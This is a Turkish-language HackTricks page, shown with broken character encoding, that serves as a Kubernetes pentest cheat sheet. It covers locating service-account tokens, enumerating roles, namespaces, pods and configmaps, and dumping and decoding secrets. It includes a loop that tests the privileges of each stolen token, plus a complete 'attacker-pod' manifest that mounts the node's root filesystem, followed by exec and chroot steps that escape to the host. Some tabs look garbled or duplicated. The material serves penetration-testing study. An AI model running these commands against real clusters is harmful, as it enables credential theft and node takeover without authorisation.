# Kubernetes Enumeration

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## Kubernetes TokenlarÄ±

EÄŸer bir makineye eriÅŸimi ele geÃ§irdiyseniz, kullanÄ±cÄ±nÄ±n bir Kubernetes platformuna eriÅŸimi olabilir. Token genellikle **`KUBECONFIG`** ortam deÄŸiÅŸkeni tarafÄ±ndan iÅŸaret edilen bir dosyada veya **`~/.kube`** iÃ§inde bulunur.

Bu klasÃ¶rde, **API sunucusuna baÄŸlanmak iÃ§in tokenlar ve yapÄ±landÄ±rmalar** iÃ§eren yapÄ±landÄ±rma dosyalarÄ± bulabilirsiniz. Bu klasÃ¶rde ayrÄ±ca daha Ã¶nce alÄ±nmÄ±ÅŸ bilgilerin bulunduÄŸu bir Ã¶nbellek klasÃ¶rÃ¼ de bulunabilir.

EÄŸer bir Kubernetes ortamÄ±nda bir pod ele geÃ§irdiyseniz, mevcut K8 ortamÄ± hakkÄ±nda tokenlar ve bilgiler bulabileceÄŸiniz baÅŸka yerler de vardÄ±r:

### Hizmet HesabÄ± TokenlarÄ±

Devam etmeden Ã¶nce, Kubernetes'te bir hizmetin ne olduÄŸunu bilmiyorsanÄ±z, **bu baÄŸlantÄ±yÄ± takip edin ve en azÄ±ndan Kubernetes mimarisi hakkÄ±ndaki bilgileri okuyun**.

Kubernetes [belgelerinden](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) alÄ±nan:

_"Bir pod oluÅŸturduÄŸunuzda, bir hizmet hesabÄ± belirtmezseniz, aynÄ± ad alanÄ±nda_ varsayÄ±lan _hizmet hesabÄ± otomatik olarak atanÄ±r."_

**ServiceAccount**, Kubernetes tarafÄ±ndan yÃ¶netilen ve bir podda Ã§alÄ±ÅŸan sÃ¼reÃ§lere kimlik saÄŸlamak iÃ§in kullanÄ±lan bir nesnedir.\
Her hizmet hesabÄ±nÄ±n ona iliÅŸkin bir sÄ±r vardÄ±r ve bu sÄ±r bir taÅŸÄ±yÄ±cÄ± belirteci iÃ§erir. Bu, iki taraf arasÄ±nda gÃ¼venli bir ÅŸekilde talepleri temsil etmek iÃ§in kullanÄ±lan bir JSON Web Token (JWT) yÃ¶ntemidir.

Genellikle aÅŸaÄŸÄ±daki dizinlerden biri:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

aÅŸaÄŸÄ±daki dosyalarÄ± iÃ§erir:

* **ca.crt**: Kubernetes iletiÅŸimlerini kontrol etmek iÃ§in CA sertifikasÄ±dÄ±r
* **namespace**: GeÃ§erli ad alanÄ±nÄ± belirtir
* **token**: GeÃ§erli podun **hizmet belirteci**ni iÃ§erir.

ArtÄ±k belirtece sahip olduÄŸunuza gÃ¶re, API sunucusunu **`KUBECONFIG`** ortam deÄŸiÅŸkeni iÃ§inde bulabilirsiniz. Daha fazla bilgi iÃ§in `(env | set) | grep -i "kuber|kube`**`"`** komutunu Ã§alÄ±ÅŸtÄ±rÄ±n.

Hizmet hesabÄ± belirteci, **sa.key** dosyasÄ±nda bulunan anahtar tarafÄ±ndan imzalanÄ±r ve **sa.pub** tarafÄ±ndan doÄŸrulanÄ±r.

**Kubernetes**'te varsayÄ±lan konum:

* /etc/kubernetes/pki

**Minikube**'de varsayÄ±lan konum:

* /var/lib/localkube/certs

### SÄ±cak Podlar

_**SÄ±cak podlar**_, ayrÄ±calÄ±klÄ± bir hizmet hesabÄ± belirteci iÃ§eren podlardÄ±r. AyrÄ±calÄ±klÄ± bir hizmet hesabÄ± belirteci, gizli bilgileri listeleme, podlar oluÅŸturma vb. gibi ayrÄ±calÄ±klÄ± gÃ¶revleri yapma iznine sahip bir belirteÃ§tir.

## RBAC

**RBAC**'Ä±n ne olduÄŸunu bilmiyorsanÄ±z, **bu bÃ¶lÃ¼mÃ¼ okuyun**.

## NumaralandÄ±rma Hile KaÄŸÄ±dÄ±

Bir K8s ortamÄ±nÄ± numaralandÄ±rmak iÃ§in aÅŸaÄŸÄ±dakilere ihtiyacÄ±nÄ±z vardÄ±r:

* Bir **geÃ§erli kimlik doÄŸrulama belirteci**. Ã–nceki bÃ¶lÃ¼mde bir kullanÄ±cÄ± belirteci ve bir hizmet hesabÄ± belirteci iÃ§in nerede arama yapÄ±lacaÄŸÄ±nÄ± gÃ¶rdÃ¼k.
* Kubernetes API'nin **adresi (**_**https://host:port**_**)**. Bu genellikle ortam deÄŸiÅŸkenlerinde ve/veya kube yapÄ±landÄ±rma dosyasÄ±nda bulunabilir.
* **Ä°steÄŸe baÄŸlÄ±**: API sunucusunu doÄŸrulamak iÃ§in **ca.crt**. Bu, belirtecin bulunduÄŸu yerlerde bulunabilir. API sunucusu sertifikasÄ±nÄ± doÄŸrulamak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r, ancak `kubectl` ile `--insecure-skip-tls-verify` veya `curl` ile `-k` kullanarak bunu yapmanÄ±za gerek yok.

Bu ayrÄ±ntÄ±larla Kubernetes'i **numaralandÄ±rabilirsiniz**. API, bir ÅŸekilde **Ä°nternet Ã¼zerinden eriÅŸilebilir** ise, bu bilgileri indirip platformu kendi makinenizden numaralandÄ±rabilirsiniz.

Ancak genellikle **API sunucusu iÃ§ aÄŸda** bulunduÄŸundan, eriÅŸimi ele geÃ§irilen makineden API sunucusuna eriÅŸmek iÃ§in bir tÃ¼nel oluÅŸturmanÄ±z veya [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) ikilisini yÃ¼klemeniz veya `curl/wget/herhangi bir ÅŸey` kullanarak API sunucusuna doÄŸrudan HTTP istekleri yapmanÄ±z gerekecektir.

### `list` ve `get` fiilleri arasÄ±ndaki farklar

**`get`** izinleriyle belirli varlÄ±klarÄ±n bilgilerine eriÅŸebilirsiniz (_`kubectl`'deki_ `describe` _seÃ§eneÄŸiyle_). API:

```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```

EÄŸer **`list`** iznine sahipseniz, bir varlÄ±k tÃ¼rÃ¼nÃ¼ listelemek iÃ§in API isteklerini gerÃ§ekleÅŸtirmenize izin verilir (_`kubectl`_ komutunda _`get`_ seÃ§eneÄŸi):

```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```

EÄŸer **`watch`** izniniz varsa, varlÄ±klarÄ± izlemek iÃ§in API isteklerini gerÃ§ekleÅŸtirmenize izin verilir:

```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```

DeÄŸiÅŸtiÄŸinde (veya yeni bir tane oluÅŸturulduÄŸunda) bir Deployment'Ä±n tam manifestini size dÃ¶ndÃ¼ren bir akÄ±ÅŸ baÄŸlantÄ±sÄ± aÃ§arlar.

{% hint style="danger" %}
AÅŸaÄŸÄ±daki `kubectl` komutlarÄ± sadece nesneleri listelemek iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± gÃ¶sterir. Verilere eriÅŸmek istiyorsanÄ±z `get` yerine `describe` kullanmanÄ±z gerekmektedir.
{% endhint %}

### Curl kullanarak

Bir pod iÃ§inden, birkaÃ§ Ã§evre deÄŸiÅŸkeni kullanabilirsiniz:

```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```

{% hint style="warning" %}
VarsayÄ±lan olarak, pod **kube-api sunucusuna** **`kubernetes.default.svc`** alan adÄ± Ã¼zerinden **eriÅŸebilir** ve kube aÄŸÄ±na **`/etc/resolv.config`** dosyasÄ±nda eriÅŸebilirsiniz, burada kubernetes DNS sunucusunun adresini bulacaksÄ±nÄ±z (aynÄ± aralÄ±ÄŸÄ±n ".1" noktasÄ± kube-api uÃ§ noktasÄ±dÄ±r).
{% endhint %}

### kubectl Kullanarak

Token ve API sunucusunun adresine sahip olduÄŸunuzda, burada belirtildiÄŸi gibi kubectl veya curl kullanarak eriÅŸebilirsiniz:

VarsayÄ±lan olarak, APISERVER `https://` ÅŸemasÄ±yla iletiÅŸim kurar

```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```

> EÄŸer URL'de `https://` yoksa, KÃ¶tÃ¼ Ä°stek gibi bir hata alabilirsiniz.

[**Burada resmi bir kubectl hile yapraÄŸÄ± bulabilirsiniz**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). AÅŸaÄŸÄ±daki bÃ¶lÃ¼mlerin amacÄ±, eriÅŸim saÄŸladÄ±ÄŸÄ±nÄ±z yeni K8s'yi sÄ±ralÄ± bir ÅŸekilde numaralandÄ±rmak ve anlamaktÄ±r.

`kubectl`'nin gÃ¶nderdiÄŸi HTTP isteÄŸini bulmak iÃ§in `-v=8` parametresini kullanabilirsiniz.

#### MitM kubectl - kubectl'i Proxy olarak kullanma

```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```

### Mevcut YapÄ±landÄ±rma

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

EÄŸer bazÄ± kullanÄ±cÄ± kimlik bilgilerini Ã§almayÄ± baÅŸardÄ±ysanÄ±z, bunlarÄ± yerel olarak yapÄ±landÄ±rabilirsiniz. Bunun iÃ§in ÅŸunu kullanabilirsiniz:

```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```

### Desteklenen KaynaklarÄ± Al

Bu bilgiyle, listeleyebileceÄŸiniz tÃ¼m hizmetleri bileceksiniz

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### Mevcut Yetkileri Al

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Yetkilerinizi kontrol etmenin baÅŸka bir yolu, [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\* aracÄ±nÄ± kullanmaktÄ±r.

**Kubernetes RBAC** hakkÄ±nda daha fazla bilgi edinmek iÃ§in ÅŸu sayfayÄ± ziyaret edebilirsiniz:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Hangi yetkilere sahip olduÄŸunuzu** Ã¶ÄŸrendikten sonra, aÅŸaÄŸÄ±daki sayfayÄ± kontrol ederek bu yetkileri **kÃ¶tÃ¼ye kullanÄ±p yetkilerinizi yÃ¼kseltebileceÄŸinizi** anlayabilirsiniz:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### DiÄŸer rolleri almak

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Ad alanlarÄ±nÄ± al

Kubernetes, aynÄ± fiziksel kÃ¼me tarafÄ±ndan desteklenen **Ã§oklu sanal kÃ¼meleri** destekler. Bu sanal kÃ¼meler **ad alanlarÄ±** olarak adlandÄ±rÄ±lÄ±r.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### SÄ±rlarÄ± al

Kubernetes kÃ¼mesindeki sÄ±rlarÄ± almak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
kubectl get secrets
```

Bu komut, kÃ¼medeki tÃ¼m sÄ±rlarÄ± listeler. SÄ±rlarÄ±n ayrÄ±ntÄ±larÄ±nÄ± gÃ¶rmek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
kubectl describe secret <secret_name>
```

`<secret_name>` yerine sÄ±rrÄ±n adÄ±nÄ± belirtmelisiniz. Bu komut, sÄ±rrÄ±n ayrÄ±ntÄ±larÄ±nÄ± gÃ¶rÃ¼ntÃ¼ler, Ã¶rneÄŸin sÄ±rrÄ±n tÃ¼rÃ¼nÃ¼, anahtarlarÄ±nÄ± ve deÄŸerlerini gÃ¶sterir.

SÄ±rlarÄ±n deÄŸerlerini gÃ¶rÃ¼ntÃ¼lemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
kubectl get secret <secret_name> -o jsonpath='{.data}'
```

Bu komut, sÄ±rrÄ±n deÄŸerlerini JSON formatÄ±nda gÃ¶rÃ¼ntÃ¼ler. DeÄŸerleri Ã§Ã¶zmek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
kubectl get secret <secret_name> -o jsonpath='{.data.<key>}' | base64 --decode
```

`<key>` yerine sÄ±rrÄ±n anahtarÄ±nÄ± belirtmelisiniz. Bu komut, sÄ±rrÄ±n belirtilen anahtarÄ±nÄ±n deÄŸerini Ã§Ã¶zer ve gÃ¶rÃ¼ntÃ¼ler.

SÄ±rlarÄ±n deÄŸerlerini gÃ¶rÃ¼ntÃ¼lemek iÃ§in aÅŸaÄŸÄ±daki komutu da kullanabilirsiniz:

```bash
kubectl get secret <secret_name> -o yaml
```

Bu komut, sÄ±rrÄ±n deÄŸerlerini YAML formatÄ±nda gÃ¶rÃ¼ntÃ¼ler. DeÄŸerleri Ã§Ã¶zmek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

```bash
kubectl get secret <secret_name> -o yaml | grep '<key>:' | awk '{print $2}' | base64 --decode
```

`<key>` yerine sÄ±rrÄ±n anahtarÄ±nÄ± belirtmelisiniz. Bu komut, sÄ±rrÄ±n belirtilen anahtarÄ±nÄ±n deÄŸerini Ã§Ã¶zer ve gÃ¶rÃ¼ntÃ¼ler.

```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```

API

```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```

EÄŸer sÄ±rlarÄ± okuyabiliyorsanÄ±z, her bir token ile ilgili ayrÄ±calÄ±klarÄ± almak iÃ§in aÅŸaÄŸÄ±daki satÄ±rlarÄ± kullanabilirsiniz:

```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```

### Hizmet HesaplarÄ±nÄ± Al

Bu sayfanÄ±n baÅŸÄ±nda tartÄ±ÅŸÄ±ldÄ±ÄŸÄ± gibi, **bir pod Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda genellikle ona bir hizmet hesabÄ± atanÄ±r**. Bu nedenle, hizmet hesaplarÄ±nÄ±, izinlerini ve nerede Ã§alÄ±ÅŸtÄ±klarÄ±nÄ± listelemek, bir kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ± yÃ¼kseltmesine olanak saÄŸlayabilir.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### DaÄŸÄ±tÄ±mlarÄ± Al

DaÄŸÄ±tÄ±mlar, Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± gereken bileÅŸenleri belirtir.

```
.k get deployments
k get deployments -n custnamespace
```

```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```

### PodlarÄ± Al

Podlar, **Ã§alÄ±ÅŸacak** olan gerÃ§ek **konteynerlerdir**.

```
k get pods
k get pods -n custnamespace
```

```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```

### Hizmetleri Al

Kubernetes **hizmetleri**, bir hizmeti belirli bir baÄŸlantÄ± noktasÄ±nda ve IP'de **sunmak iÃ§in kullanÄ±lÄ±r** (aslÄ±nda hizmeti sunan podlara yÃ¼k dengeleyici olarak hareket eder). Bu, saldÄ±rmaya Ã§alÄ±ÅŸabileceÄŸiniz diÄŸer hizmetleri bulabileceÄŸiniz yerleri bilmek aÃ§Ä±sÄ±ndan ilginÃ§tir.

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### DÃ¼ÄŸÃ¼mleri Al

KÃ¼me iÃ§inde yapÄ±landÄ±rÄ±lmÄ±ÅŸ olan **tÃ¼m dÃ¼ÄŸÃ¼mleri alÄ±n**.

```
k get nodes
```

API

```bash
kurl -v https://$APISERVER/api/v1/nodes/
```

### DaemonSetleri Al

**DaemonSetler**, kÃ¼menin tÃ¼m dÃ¼ÄŸÃ¼mlerinde (veya seÃ§ilen dÃ¼ÄŸÃ¼mlerde) **belirli bir pod'un Ã§alÄ±ÅŸtÄ±ÄŸÄ±ndan** emin olmayÄ± saÄŸlar. DaemonSet'i silerseniz, onun tarafÄ±ndan yÃ¶netilen pod'lar da kaldÄ±rÄ±lÄ±r.

```
k get daemonsets
```

```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```

### Cronjobu al

Cron iÅŸleri, crontab benzeri bir sÃ¶zdizimi kullanarak bir eylem gerÃ§ekleÅŸtirecek bir pod'un baÅŸlatÄ±lmasÄ±nÄ± zamanlamak iÃ§in kullanÄ±lÄ±r.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### ConfigMap Al

configMap her zaman kubernetes'te Ã§alÄ±ÅŸan uygulamalara saÄŸlanan birÃ§ok bilgi ve yapÄ±landÄ±rma dosyasÄ± iÃ§erir. Genellikle, diÄŸer iÃ§/dÄ±ÅŸ hizmetlere baÄŸlanmak ve doÄŸrulamak iÃ§in kullanÄ±lan birÃ§ok parola, gizli bilgi ve belirteÃ§ bulabilirsiniz.

{% tabs %}
{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="undefined" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% tab title="kubectl" %}
Kubernetes, birÃ§ok farklÄ± kaynak tÃ¼rÃ¼nden bilgileri almak iÃ§in `get all` komutunu saÄŸlar. Bu komut, tÃ¼m kaynak tÃ¼rlerini listeleyerek, Kubernetes kÃ¼mesindeki tÃ¼m kaynaklarÄ± gÃ¶rÃ¼ntÃ¼ler.

```bash
kubectl get all
```

Bu komut, tÃ¼m kaynak tÃ¼rlerini ve bunlara ait ayrÄ±ntÄ±larÄ± gÃ¶rÃ¼ntÃ¼ler. Bu, Kubernetes kÃ¼mesindeki tÃ¼m kaynaklarÄ± hÄ±zlÄ± bir ÅŸekilde kontrol etmek iÃ§in kullanÄ±ÅŸlÄ± bir yÃ¶ntemdir.
{% endtab %}

{% tab title="kubebctl" %}
Kubernetes, `get all` komutunu kullanarak Ã§eÅŸitli kaynak tÃ¼rlerinden bilgiler almanÄ±za olanak tanÄ±r. Bu komut, tÃ¼m kaynak tÃ¼rlerini listeleyerek, Kubernetes kÃ¼mesindeki tÃ¼m kaynaklarÄ± gÃ¶rÃ¼ntÃ¼ler.

```bash
kubebctl get all
```

Bu komut, tÃ¼m kaynak tÃ¼rlerini ve bunlara ait ayrÄ±ntÄ±larÄ± gÃ¶rÃ¼ntÃ¼ler. Bu, Kubernetes kÃ¼mesindeki tÃ¼m kaynaklarÄ± hÄ±zlÄ± bir ÅŸekilde kontrol etmek iÃ§in kullanÄ±ÅŸlÄ± bir yÃ¶ntemdir.
{% endtab %}
{% endtabs %}

```
k get all
```

### **PodlarÄ±n tÃ¼ketimini alÄ±n**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Pod'dan KaÃ§ma

Yeni pod'lar oluÅŸturabiliyorsanÄ±z, onlardan dÃ¼ÄŸÃ¼me kaÃ§abilirsiniz. Bunun iÃ§in bir yaml dosyasÄ± kullanarak yeni bir pod oluÅŸturmanÄ±z, oluÅŸturulan pod'a geÃ§meniz ve ardÄ±ndan dÃ¼ÄŸÃ¼mÃ¼n sistemine chroot yapmanÄ±z gerekmektedir. Var olan pod'larÄ± referans olarak kullanabilirsiniz Ã§Ã¼nkÃ¼ mevcut gÃ¶rÃ¼ntÃ¼leri ve yollarÄ± gÃ¶sterirler.

```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```

> EÄŸer belirli bir dÃ¼ÄŸÃ¼mde pod oluÅŸturmanÄ±z gerekiyorsa, dÃ¼ÄŸÃ¼mdeki etiketleri almak iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
>
> `k get nodes --show-labels`
>
> Genellikle, kubernetes.io/hostname ve node-role.kubernetes.io/master etiketleri seÃ§im iÃ§in uygundur.

ArdÄ±ndan attack.yaml dosyanÄ±zÄ± oluÅŸturun.

```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```

[orijinal yaml kaynaÄŸÄ±](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Bundan sonra pod'u oluÅŸturun.

```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```

Åimdi oluÅŸturulan pod'a aÅŸaÄŸÄ±daki gibi geÃ§ebilirsiniz:

```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```

Ve son olarak, dÃ¼ÄŸÃ¼mÃ¼n sistemine chroot yaparsÄ±nÄ±z.

```bash
chroot /root /bin/bash
```

Referanslar

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸÃ¼n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ile Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
